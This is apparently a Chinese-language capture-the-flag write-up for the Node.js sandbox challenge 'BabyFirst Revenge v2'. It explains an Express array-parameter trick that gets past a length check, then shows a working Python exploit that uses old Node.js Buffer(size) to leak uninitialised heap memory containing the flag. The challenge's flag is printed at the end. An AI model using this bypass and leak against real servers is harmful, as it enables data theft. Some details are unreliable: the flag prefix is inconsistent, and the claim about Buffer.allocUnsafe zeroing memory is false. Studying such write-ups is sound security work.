---
title: 'leeeeeeeeeaking~ / BabyFirst Revenge v2'
date: '2026-06-27'
modifiedTime: '2026-06-27'
intro: 'Node.js + Express + VM2 沙箱题目。表面上要求 12 字符以内执行任意 JS，实际上有两个关键漏洞：**Express 数组参数绕过长度限制** + **Node.js 旧版 `Buffer(size)` 内存泄露**'
tags: ['ctf', 'writeup', 'cve', 'python']
cover: ''
---

# leeeeeeeeeaking~ / BabyFirst Revenge v2

## Summary

Node.js + Express + VM2 沙箱题目。表面上要求 12 字符以内执行任意 JS，实际上有两个关键漏洞：**Express 数组参数绕过长度限制** + **Node.js 旧版 `Buffer(size)` 内存泄露**，后者正是题名 "leaking" 的暗示。

## Solution

### Step 1: Express 数组参数绕过 12 字符限制

题目检查 `req.query.data.length <= 12`，但 Express（qs 解析器）支持 `data[0]=value` 语法，会将 `req.query.data` 解析为数组 `["value"]`。**数组长度 = 1 ≤ 12，但元素内容无限长**。

### Step 2: Buffer 内存泄露读取 flag

题名 "leeeeeeeeeaking~" 暗示信息泄露。在 Node.js 8.x 中，已弃用的 `Buffer(size)` 构造函数返回**未初始化堆内存**，其中残留了此前请求中 `eval` 创建的 flag 字符串。

**一次性 exploit 脚本：**

```python
import urllib.request
import urllib.parse
import re

BASE = "http://目标地址:80"

# Payload: Buffer 内存泄露 — 旧版 Node.js Buffer(n) 返回未初始化内存
payload = "Buffer(16384).toString()"
encoded = urllib.parse.quote(payload, safe='')

url = f"{BASE}?data%5B0%5D={encoded}"  # data[0] 数组绕过 12 字符限制

resp = urllib.request.urlopen(url).read().decode('utf-8', errors='replace')

# 从内存 dump 中提取 flag
match = re.search(r'CTF2?\{[^}]+\}', resp)
if match:
    print("FLAG:", match.group())
```

### 核心原理

1. **数组绕过** — `data[0]=code` → Express 解析为 `req.query.data = ["code"]` → `.length` 为 1（数组长度），绕过 12 字符检查
2. **内存泄露** — 服务器每次请求执行 `eval("var flag_<random> = \"hitcon{" + flag + "}\"")`，flag 以字符串形式存在于 V8 堆内存中；旧版 `Buffer(n)` 创建未初始化 buffer，读取到残留的 heap 数据

### 注意点

- `Buffer.allocUnsafe` 在新版 Node.js 中已清零内存，不可用
- 需要多次尝试（内存布局每次不同），通常前几次即可命中

## Flag

```
CTF2{7ca4c147-11dc-4664-8e96-45e418d1064e}
```
